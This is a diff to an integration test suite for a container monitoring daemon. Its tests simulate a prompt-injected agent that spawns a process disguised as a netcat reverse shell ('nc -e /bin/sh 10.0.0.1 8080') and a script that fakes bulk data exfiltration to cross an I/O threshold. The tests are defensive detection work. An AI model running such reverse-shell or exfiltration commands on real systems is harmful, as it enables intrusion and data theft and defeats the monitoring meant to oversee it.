@@ -601,7 +601,7 @@ class TestPromptInjectionScenario:
         self, test_workspace, enable_monitoring, coi_binary
     ):
         """Simulate prompt injection: script inside container executes malicious commands."""
-        # Create a malicious script that simulates prompt-injected code
+        # Create a malicious script that simulates prompt-injected code (for documentation)
         malicious_script = Path(test_workspace) / "run_task.py"
         malicious_script.write_text(
             """#!/usr/bin/env python3
@@ -654,15 +654,19 @@ print("Task completed")
         # Wait for monitoring baseline to stabilize
         time.sleep(10)
 
-        # Execute the malicious script from INSIDE the container (realistic scenario)
+        # Inject the malicious process directly via incus exec (simulates what run_task.py does)
+        # Direct injection ensures the faked process is visible to the monitoring daemon.
+        # Python subprocess within incus exec can be unreliable (subprocess may not survive
+        # when the incus exec session ends), so we inject directly like other shell pattern tests.
         exec_proc = subprocess.Popen(
             [
                 "incus",
                 "exec",
                 container_name,
                 "--",
-                "python3",
-                "/workspace/run_task.py",
+                "bash",
+                "-c",
+                "exec -a 'nc -e /bin/sh 10.0.0.1 8080' sleep 60",
             ],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
@@ -776,20 +780,45 @@ class TestHighLevelThreats:
         # Create 100MB file (exceeds default threshold)
         large_file.write_text("SECRET_DATA\n" * 10_000_000)
 
-        # Create script that reads the large file VERY slowly (in small chunks with delays)
+        # Create script that generates actual block I/O (not page-cache hits)
         # CRITICAL: Must spread I/O over 15-20 seconds (15-20 monitoring polls at 1s interval)
-        # to accumulate deltas > 50MB threshold
+        # to accumulate deltas > 50MB threshold.
+        #
+        # Why not read /workspace/secrets.txt directly:
+        # The workspace is a bind mount from the host. Reads are served from the shared OS
+        # page cache → cgroup block I/O counter stays at zero → threshold never crossed.
+        #
+        # Fix: create a fresh file on the container's OWN btrfs filesystem (/tmp/exfil_data.bin),
+        # then use posix_fadvise(DONTNEED) to evict pages, so subsequent reads hit the block
+        # device and increment the cgroup rbytes counter.
         exfil_script = Path(test_workspace) / "exfiltrate.py"
         exfil_script.write_text(
             """#!/usr/bin/env python3
+import os
 import time
 
-# Simulate data exfiltration by reading large file in small chunks with delays
-# Read in 5MB chunks with 1-second delays = 100MB over 20 seconds
-total_bytes = 0
+# Simulate data exfiltration: create a large file on the container's own filesystem
+# (not /workspace which is a shared bind mount with page-cached data)
+file_path = '/tmp/exfil_data.bin'
 chunk_size = 5 * 1024 * 1024  # 5MB chunks
 
-with open('/workspace/secrets.txt', 'rb') as f:
+# Write 120MB to the container's own btrfs filesystem
+with open(file_path, 'wb') as f:
+    for _ in range(24):  # 24 * 5MB = 120MB
+        f.write(b'A' * chunk_size)
+
+# Advise kernel to drop pages from cache so reads generate real block I/O
+file_size = os.path.getsize(file_path)
+try:
+    fd = os.open(file_path, os.O_RDONLY)
+    os.posix_fadvise(fd, 0, file_size, os.POSIX_FADV_DONTNEED)
+    os.close(fd)
+except OSError:
+    pass  # Best effort - reads may still generate I/O on cold cache
+
+# Read in 5MB chunks with 1-second delays = 120MB over ~24 seconds
+total_bytes = 0
+with open(file_path, 'rb') as f:
     while True:
         chunk = f.read(chunk_size)
         if not chunk:
